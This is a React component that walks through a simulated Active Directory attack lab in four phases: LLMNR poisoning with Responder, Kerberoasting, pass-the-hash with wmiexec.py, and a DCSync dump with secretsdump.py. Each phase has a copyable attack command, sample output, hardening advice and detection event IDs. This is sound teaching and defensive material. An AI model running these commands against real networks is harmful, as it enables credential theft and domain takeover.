import React, { useState } from 'react';
import {
  Shield, Server, Laptop, Terminal, ArrowRight, CheckCircle2,
  AlertTriangle, Lock, Eye, ExternalLink, Network, RefreshCw,
  Cpu, Copy, Check
} from 'lucide-react';

const ATTACK_PHASES = [
  {
    phase: 1,
    title: 'Initial Foothold & LLMNR Poisoning',
    tactic: 'Credential Access (TA0006)',
    tool: 'Responder v3.1.4',
    source: 'KALI (192.168.56.5)',
    target: 'CORP-WS01 (192.168.56.20)',
    command: 'sudo responder -I eth0 -dwv',
    summary: 'Exploited Windows multicast name resolution fallback when a workstation requested a misspelled file share (\\\\corp-fileshare). Captured NetNTLMv2 hash of user CORP\\jdoe.',
    rawOutput: `[+] [LLMNR]  Poisoned answer sent to 192.168.56.20 for name fileshare.corp.local
[+] [SMB] NTLMv2-SSP Hash captured from 192.168.56.20:
    CORP.LOCAL\\jdoe::CORP:32b904e1:84a0c841:F91B...`,
    defense: 'Disable LLMNR via Group Policy (Computer Configuration -> Administrative Templates -> Network -> DNS Client -> Turn off multicast name resolution). Enforce SMB signing.',
    eventIds: 'Event ID 4624 (Logon Type 3), Sysmon Event ID 3 (Network Connection)'
  },
  {
    phase: 2,
    title: 'Kerberoasting Service Accounts',
    tactic: 'Credential Access & Lateral Movement',
    tool: 'Impacket GetUserSPNs.py + Hashcat',
    source: 'KALI (192.168.56.5)',
    target: 'CORP-DC01 (192.168.56.10)',
    command: 'GetUserSPNs.py CORP.LOCAL/jdoe:Welcome2025! -request -dc-ip 192.168.56.10 -outputfile hashes.kerberoast',
    summary: 'Queried the Domain Controller for user accounts registered with Service Principal Names (SPNs). Requested TGS tickets encrypted with the service account NTLM hash and cracked offline.',
    rawOutput: `[+] ServicePrincipalName: MSSQLSvc/sql01.corp.local:1433
[+] Account: svc_sql
[+] Hash: $krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*...
[+] Cracking with hashcat -m 13100 -> Cracked: "DatabaseAdmin!2024"`,
    defense: 'Ensure service accounts use randomly generated 25+ character passwords or transition to Group Managed Service Accounts (gMSA) which rotate passwords automatically.',
    eventIds: 'Event ID 4769 (Kerberos Service Ticket Operations) with Ticket Encryption 0x17 (RC4-HMAC)'
  },
  {
    phase: 3,
    title: 'Lateral Movement & Pass-The-Hash',
    tactic: 'Lateral Movement (TA0008)',
    tool: 'Impacket wmiexec.py',
    source: 'KALI (192.168.56.5)',
    target: 'CORP-WS02 (192.168.56.21)',
    command: 'wmiexec.py -hashes :7c4a8d09ca3762af61e59520943dc264 CORP.LOCAL/svc_sql@192.168.56.21',
    summary: 'svc_sql possessed local administrator privileges on CORP-WS02. Authenticated via NTLM hash over WMI/RPC without knowing the plaintext password, bypassing Windows Defender default rules.',
    rawOutput: `[!] Launching semi-interactive shell through WMI on 192.168.56.21
C:\\Windows\\system32> whoami
corp\\svc_sql
C:\\Windows\\system32> net localgroup administrators
Administrator, svc_sql, itadmin`,
    defense: 'Enforce Local Administrator Password Solution (LAPS) to randomize local administrator passwords across every endpoint. Restrict remote WMI/RPC ports.',
    eventIds: 'Event ID 4624 (Logon Type 3 - Network), Event ID 4672 (Special privileges assigned)'
  },
  {
    phase: 4,
    title: 'DCSync & Domain Forest Compromise',
    tactic: 'Privilege Escalation & Impact (TA0004)',
    tool: 'Impacket secretsdump.py',
    source: 'CORP-WS02 (192.168.56.21)',
    target: 'CORP-DC01 (192.168.56.10)',
    command: 'secretsdump.py CORP.LOCAL/itadmin:AdminMaster2025!@192.168.56.10 -just-dc-user Administrator',
    summary: 'Harvested itadmin credentials from memory on CORP-WS02; itadmin possessed DS-Replication-Get-Changes-All extended rights on the domain root. Emulated a domain controller via DCSync to dump the Administrator NTLM hash.',
    rawOutput: `[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:afff6209e51e70e9f8...:::
[+] Domain Controller fully compromised. Domain Administrator persistence achieved.`,
    defense: 'Audit Active Directory ACLs using BloodHound to identify non-DC accounts with DS-Replication rights. Monitor for Event ID 4662 indicating Directory Service replication calls from non-DC IP addresses.',
    eventIds: 'Event ID 4662 (An operation was performed on an object) with replication GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  }
];

export default function ActiveDirectoryLabVisualizer() {
  const [activePhaseIndex, setActivePhaseIndex] = useState(0);
  const [viewTab, setViewTab] = useState('attack'); // 'attack' | 'defense' | 'topology'
  const [copiedCommand, setCopiedCommand] = useState(false);

  const current = ATTACK_PHASES[activePhaseIndex];

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedCommand(true);
    setTimeout(() => setCopiedCommand(false), 2000);
  };

  return (
    <div className="card p-6 sm:p-8 border-indigo-500/20 bg-gradient-to-b from-slate-900/90 to-slate-950">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-6 border-b border-white/[0.08]">
        <div>
          <div className="flex items-center gap-2 mb-2">
            <span className="h-2 w-2 rounded-full bg-indigo-400 animate-pulse" />
            <span className="text-xs font-mono uppercase tracking-wider text-indigo-400 font-semibold">
              Interactive Attack Simulation · Enterprise AD Attack Lab
            </span>
          </div>
          <h3 className="text-xl sm:text-2xl font-bold text-white tracking-tight">
            Active Directory Multi-Stage Kill Chain & Topology
          </h3>
          <p className="text-sm text-zinc-400 mt-1 max-w-2xl leading-relaxed">
            Step through Haridev's simulated 4-machine enterprise environment: from initial LLMNR poisoning to Kerberoasting, lateral movement, and DCSync Domain Admin takeover.
          </p>
        </div>

        <div className="flex items-center gap-2 self-start sm:self-auto">
          <a
            href="https://github.com/haridevp/Enterprise-AD-Attack-Lab"
            target="_blank"
            rel="noopener noreferrer"
            className="btn-secondary text-xs flex items-center gap-1.5"
          >
            <span>Lab Repo</span>
            <ExternalLink size={13} />
          </a>
        </div>
      </div>

      {/* 4-Node Lab Architecture Mini-Bar */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 my-6">
        <div className={`p-3 rounded-lg border transition-all ${
          current.target.includes('DC01') || current.source.includes('DC01')
            ? 'bg-indigo-500/10 border-indigo-500/40'
            : 'bg-white/[0.02] border-white/[0.06]'
        }`}>
          <div className="flex items-center gap-1.5 text-xs font-mono text-indigo-400 mb-1">
            <Server size={13} />
            <span className="font-semibold">CORP-DC01</span>
          </div>
          <div className="text-[11px] font-mono text-zinc-400">192.168.56.10</div>
          <div className="text-[11px] text-zinc-500">Win Server 2022 DC</div>
        </div>

        <div className={`p-3 rounded-lg border transition-all ${
          current.target.includes('WS01') || current.source.includes('WS01')
            ? 'bg-indigo-500/10 border-indigo-500/40'
            : 'bg-white/[0.02] border-white/[0.06]'
        }`}>
          <div className="flex items-center gap-1.5 text-xs font-mono text-zinc-300 mb-1">
            <Laptop size={13} />
            <span className="font-semibold">CORP-WS01</span>
          </div>
          <div className="text-[11px] font-mono text-zinc-400">192.168.56.20</div>
          <div className="text-[11px] text-zinc-500">Win 11 (jdoe)</div>
        </div>

        <div className={`p-3 rounded-lg border transition-all ${
          current.target.includes('WS02') || current.source.includes('WS02')
            ? 'bg-indigo-500/10 border-indigo-500/40'
            : 'bg-white/[0.02] border-white/[0.06]'
        }`}>
          <div className="flex items-center gap-1.5 text-xs font-mono text-zinc-300 mb-1">
            <Laptop size={13} />
            <span className="font-semibold">CORP-WS02</span>
          </div>
          <div className="text-[11px] font-mono text-zinc-400">192.168.56.21</div>
          <div className="text-[11px] text-zinc-500">Win 11 (itadmin)</div>
        </div>

        <div className={`p-3 rounded-lg border transition-all ${
          current.source.includes('KALI')
            ? 'bg-red-500/10 border-red-500/40'
            : 'bg-white/[0.02] border-white/[0.06]'
        }`}>
          <div className="flex items-center gap-1.5 text-xs font-mono text-red-400 mb-1">
            <Terminal size={13} />
            <span className="font-semibold">KALI-ATTACKER</span>
          </div>
          <div className="text-[11px] font-mono text-zinc-400">192.168.56.5</div>
          <div className="text-[11px] text-zinc-500">Kali Linux 2025</div>
        </div>
      </div>

      {/* Stepper Buttons */}
      <div className="flex flex-wrap items-center gap-2 mb-6">
        {ATTACK_PHASES.map((p, idx) => (
          <button
            key={p.phase}
            type="button"
            onClick={() => setActivePhaseIndex(idx)}
            className={`text-xs font-mono px-3.5 py-2 rounded-lg border transition-all flex items-center gap-2 cursor-pointer ${
              activePhaseIndex === idx
                ? 'bg-indigo-500/20 border-indigo-400/60 text-white shadow-sm shadow-indigo-500/20 font-semibold'
                : 'bg-white/[0.03] border-white/[0.08] text-zinc-400 hover:text-zinc-200 hover:bg-white/[0.06]'
            }`}
          >
            <span className={`w-4 h-4 rounded-full text-[10px] flex items-center justify-center font-bold ${
              activePhaseIndex === idx ? 'bg-indigo-400 text-slate-950' : 'bg-white/10 text-zinc-400'
            }`}>
              {p.phase}
            </span>
            <span>{p.title.split('&')[0].trim()}</span>
          </button>
        ))}
      </div>

      {/* Tab Switcher: Attack Vector vs Defense & Detection vs Lab Topology */}
      <div className="flex items-center gap-4 mb-4 border-b border-white/[0.06] text-xs font-mono">
        <button
          type="button"
          onClick={() => setViewTab('attack')}
          className={`pb-2 transition-colors cursor-pointer ${
            viewTab === 'attack' ? 'text-indigo-300 border-b-2 border-indigo-400 font-semibold' : 'text-zinc-500 hover:text-zinc-300'
          }`}
        >
          Offensive Vector & Execution
        </button>
        <button
          type="button"
          onClick={() => setViewTab('defense')}
          className={`pb-2 transition-colors cursor-pointer ${
            viewTab === 'defense' ? 'text-indigo-300 border-b-2 border-indigo-400 font-semibold' : 'text-zinc-500 hover:text-zinc-300'
          }`}
        >
          Blue Team Detection & Hardening
        </button>
      </div>

      {/* Tab Content */}
      {viewTab === 'attack' ? (
        <div className="space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 p-3.5 rounded-lg bg-black/40 border border-white/[0.06] text-xs font-mono">
            <div>
              <span className="text-zinc-500">VECTOR:</span> <span className="text-indigo-300 font-semibold">{current.title}</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-zinc-500">TOOL:</span> <span className="text-emerald-400">{current.tool}</span>
              <span className="text-zinc-600">·</span>
              <span className="text-zinc-400">{current.tactic}</span>
            </div>
          </div>

          <p className="text-sm text-zinc-300 leading-relaxed">
            {current.summary}
          </p>

          {/* Interactive Shell Execution */}
          <div className="rounded-xl bg-black/75 border border-white/[0.08] p-4 font-mono text-xs overflow-hidden">
            <div className="flex items-center justify-between pb-2 mb-2 border-b border-white/[0.06]">
              <span className="text-zinc-500">kali@strike:~$</span>
              <button
                type="button"
                onClick={() => handleCopy(current.command)}
                className="flex items-center gap-1 text-[11px] text-zinc-400 hover:text-white transition-colors"
              >
                {copiedCommand ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
                <span>{copiedCommand ? 'Copied' : 'Copy Command'}</span>
              </button>
            </div>
            <div className="text-emerald-300 font-semibold mb-3 selection:bg-emerald-500/30">
              {current.command}
            </div>
            <div className="pt-2 border-t border-white/[0.06] text-zinc-400 whitespace-pre-wrap leading-relaxed text-[11px]">
              {current.rawOutput}
            </div>
          </div>
        </div>
      ) : (
        <div className="space-y-4 p-4 rounded-xl bg-slate-900/60 border border-white/[0.08]">
          <div>
            <div className="flex items-center gap-2 text-xs font-mono text-emerald-400 uppercase font-semibold mb-1">
              <Shield size={14} />
              <span>Remediation & Hardening Directive</span>
            </div>
            <p className="text-sm text-zinc-300 leading-relaxed">
              {current.defense}
            </p>
          </div>

          <div className="pt-3 border-t border-white/[0.06]">
            <div className="text-xs font-mono text-zinc-400 uppercase mb-1">
              Telemetry & SIEM Correlation:
            </div>
            <div className="p-3 rounded bg-black/40 border border-white/[0.06] font-mono text-xs text-indigo-300">
              {current.eventIds}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
